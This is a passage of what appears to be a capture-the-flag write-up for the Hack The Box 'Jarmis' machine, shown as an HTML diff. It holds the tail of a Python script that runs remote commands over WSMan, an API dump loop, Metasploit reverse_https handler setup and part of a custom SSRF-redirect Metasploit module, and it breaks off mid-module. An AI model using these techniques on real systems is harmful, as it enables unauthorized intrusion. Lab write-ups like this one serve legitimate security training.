+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;https://</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">:5986/wsman&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>DATA<span style="color:#f92672">.</span>format(command), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    output <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;&lt;p:StdOut&gt;(.*)&lt;/p:StdOut&gt;&#39;</span>, r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;&lt;p:StdErr&gt;(.*)&lt;/p:StdErr&gt;&#39;</span>, r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> output:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> output<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>            print(output<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#39;&amp;#10;&#39;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> error:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> error<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>            print(error<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#39;&amp;#10;&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-t&#39;</span>, <span style="color:#e6db74">&#39;--target&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;The IP address of the target&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-c&#39;</span>, <span style="color:#e6db74">&#39;--command&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;The command to run&#39;</span>)
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>    exploit(args<span style="color:#f92672">.</span>target, args<span style="color:#f92672">.</span>command)
+</span></span></code></pre></div><p>==&gt; We can do some more enumeration on the <code>/search</code>endpoint as we can dump the database there by requesting all of the different ids on the server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://jarmis.htb/api/v1/search/id/222
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>:222,<span style="color:#e6db74">&#34;sig&#34;</span>:<span style="color:#e6db74">&#34;27d27d27d00027d1dc27d27d27d27d3446fb8839649f251e5083970c44ad30&#34;</span>,<span style="color:#e6db74">&#34;ismalicious&#34;</span>:false,<span style="color:#e6db74">&#34;endpoint&#34;</span>:<span style="color:#e6db74">&#34;47.246.24.234:443&#34;</span>,<span style="color:#e6db74">&#34;note&#34;</span>:<span style="color:#e6db74">&#34;login.tmall.com&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>and after some easy trial and error, we discover that there are <strong>222</strong> entries -&gt; we can make a small bash script to retrieve all of them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>output_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;results.json&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[&#34;</span> &gt; <span style="color:#e6db74">&#34;</span>$output_file<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> id in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">0</span> 222<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  response<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s <span style="color:#e6db74">&#34;http://jarmis.htb/api/v1/search/id/</span>$id<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;</span>$response<span style="color:#e6db74">,&#34;</span> &gt;&gt; <span style="color:#e6db74">&#34;</span>$output_file<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;$ s/,$//&#39;</span> <span style="color:#e6db74">&#34;</span>$output_file<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;]&#34;</span> &gt;&gt; <span style="color:#e6db74">&#34;</span>$output_file<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Results saved to </span>$output_file<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>With this script executed, we now have the entire database in the file <code>results.json</code>
+-&gt; We can then filter to display only the ones deemed malicious:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">cat</span> <span style="color:#960050;background-color:#1e0010">results.json</span> <span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">jq</span> <span style="color:#960050;background-color:#1e0010">&#39;.</span>[] <span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">select(.ismalicious==</span><span style="color:#66d9ef">true</span><span style="color:#960050;background-color:#1e0010">)&#39;</span>                         
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">95</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;2ad2ad00000000000043d2ad2ad43dc4b09cccb7c1d19522df9b67bf57f4fb&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;104.24.4.98&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Sliver&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;Apache/2.4.40&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">128</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;2ad2ad0002ad2ad00042d42d000000ad9bf51cc3f5a1e29eecb81d0c7b06eb&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;185.199.109.153&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;SilentTrinity&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">135</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;104.24.4.98&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Ncat&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">154</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;99.86.230.31&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Metasploit&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;apache&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">170</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;22b22b09b22b22b22b22b22b22b22b352842cd5d6b0278445702035e06875c&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;94.140.114.239&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Trickbot&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;Cowboy&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">174</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;29d21b20d29d29d21c41d21b21b41d494e0df9532e75299f15ba73156cee38&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;192.64.119.215&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">178</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;1dd40d40d00040d1dc1dd40d1dd40d3df2d6a0c2caaa0dc59908f0d3602943&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;192.145.239.18&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;AsyncRAT&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">179</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;2ad2ad0002ad2ad00043d2ad2ad43da5207249a18099be84ef3c8811adc883&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;94.140.114.239&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Sliver&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;Apache/2.4.38&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">184</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;28d28d28d00028d00041d28d28d41dd279b0cf765af27fa62e66d7c8281124&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;51.136.77.112&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Gophish&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;nginx&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">197</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;104.17.237.190&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;CobaltStrike&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>and we see a few ones. We can apply even more filtering by using this next command to only display the <code>note</code>and the <code>id</code>of each malicious entry:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat results.json | jq -c <span style="color:#e6db74">&#39;.[] | select(.ismalicious==true) | [.id, .note]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>95,<span style="color:#e6db74">&#34;Sliver&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>128,<span style="color:#e6db74">&#34;SilentTrinity&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>135,<span style="color:#e6db74">&#34;Ncat&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>154,<span style="color:#e6db74">&#34;Metasploit&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>170,<span style="color:#e6db74">&#34;Trickbot&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>174,null<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>178,<span style="color:#e6db74">&#34;AsyncRAT&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>179,<span style="color:#e6db74">&#34;Sliver&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>184,<span style="color:#e6db74">&#34;Gophish&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>197,<span style="color:#e6db74">&#34;CobaltStrike&#34;</span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>And one of the entry immediately jumps out as it has <code>Metasploit</code>in its name &ndash;&gt; this might mean that a connection to it will respond to us!!</p>
+<p>==&gt; This next part was really difficult as it is pretty hard and I did not have much experience with this. The next goal is to try and get a connection to our <code>Metasploit</code>running locally. To do so, we can first setup a <code>/multi/handler</code>with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfconsole
+</span></span><span style="display:flex;"><span>use exploit/multi/handler
+</span></span><span style="display:flex;"><span>set payload windows/meterpreter/reverse_https
+</span></span><span style="display:flex;"><span>set LHOST tun0
+</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">443</span>
+</span></span></code></pre></div><p>We can also open <code>WireShark</code>and observe the requests made when we query the database:</p>
+<p><img src="Jarmis_Wireshark.png" alt=""></p>
+<p>and we do see the 10 requests that <code>JARM</code>is supposed to make. Interestingly, when our request is deemed malicious then there is a 12th <code>TCP</code>stream Running the command on our server gives us this result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://jarmis.htb/api/v1/fetch?endpoint<span style="color:#f92672">=</span>http://10.10.14.146:443 | jq .
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;07d19d12d21d21d07c42d43d000000f50d155305214cf247147c43c0f1a823&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;ismalicious&#34;</span>: true,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;10.10.14.146:443&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Metasploit&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;Apache&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>We also see that other than the <code>TLS</code>streams that we cannot read, the last <code>TCP</code>stream (when our input is malicious) can be read:</p>
+<p><img src="Jarmis_tcp.png" alt=""></p>
+<p>As mentioned in the <code>/fetch</code>API documentation, the extra <code>TLS</code>stream is to fetch information on the server. &ndash;&gt; We can then try to capture it!</p>
+<p>To do so, we can use the <code>/server/capture/http</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use auxiliary/server/capture/http
+</span></span><span style="display:flex;"><span>set ssl true
+</span></span><span style="display:flex;"><span>set srvport <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>run
+</span></span></code></pre></div><p>and upon querying the database again, we see a slightly different response from the server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">curl</span> <span style="color:#960050;background-color:#1e0010">-s</span> <span style="color:#960050;background-color:#1e0010">-X</span> <span style="color:#960050;background-color:#1e0010">&#39;GET&#39;</span> <span style="color:#960050;background-color:#1e0010">&#39;http:</span><span style="color:#75715e">//jarmis.htb/api/v1/fetch?endpoint=10.10.14.146&#39; -H &#39;accept: application/json&#39; | jq
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;07d19d12d21d21d07c42d43d000000f50d155305214cf247147c43c0f1a823&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ismalicious&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;10.10.14.146:443&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Metasploit?&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>and on our server, we see this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>server/capture/http<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> HTTP REQUEST 10.129.95.238 &gt; 10.10.14.146:80 GET / Unknown   cookies<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>Now comes the atrocious part, we need to create a custom <code>Metasploit</code>module to see if we can redirect the 11th request. The process to do so is the following:</p>
+<h3 id="metasploit-custom-module">Metasploit custom module</h3>
+<p>We need to create a new directory for our module, and add a script there:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mkdir -p /root/.msf4/modules/auxiliary/server/
+</span></span><span style="display:flex;"><span>sudo cp /usr/share/metasploit-framework/modules/auxiliary/server/capture/http_basic.rb
+</span></span><span style="display:flex;"><span>/root/.msf4/modules/auxiliary/server/jarmisRedirect.rb
+</span></span></code></pre></div><p>Now that this is done, we can then transform the full script and keep this part. The script can be downloaded from <a href="https://0xdf.gitlab.io/files/jarmis-msf-mod.rb">0xdf&rsquo;s website</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This module requires Metasploit: https://metasploit.com/download</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Current source: https://github.com/rapid7/metasploit-framework</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MetasploitModule</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Auxiliary</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">include</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Exploit</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Remote</span><span style="color:#f92672">::</span><span style="color:#66d9ef">HttpServer</span><span style="color:#f92672">::</span><span style="color:#66d9ef">HTML</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">include</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Auxiliary</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Report</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initialize</span>(info<span style="color:#f92672">=</span>{})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">super</span>(update_info(info,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;Name&#39;</span>        <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Redirect Jarmis Scanner to something else&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;Description&#39;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">%q{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        The Jarmis Scanner will try to collect content from a server it detects as a known
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        malicious JARM. MSF is that, and therefore this module will redirect that last request
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        to some other url for SSRF.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;Author&#39;</span>      <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;0xdf&#39;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;License&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">MSF_LICENSE</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;Actions&#39;</span>     <span style="color:#f92672">=&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;Redirect&#39;</span>, <span style="color:#e6db74">&#39;Description&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Run redirect web server&#39;</span> <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;PassiveActions&#39;</span> <span style="color:#f92672">=&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;Redirect&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;DefaultAction&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Redirect&#39;</span>
+</span></span><span style="display:flex;"><span>    ))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    register_options(
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">OptPort</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#39;SRVPORT&#39;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;The local port to listen on.&#34;</span>, <span style="color:#ae81ff">443</span> <span style="color:#f92672">]</span>),
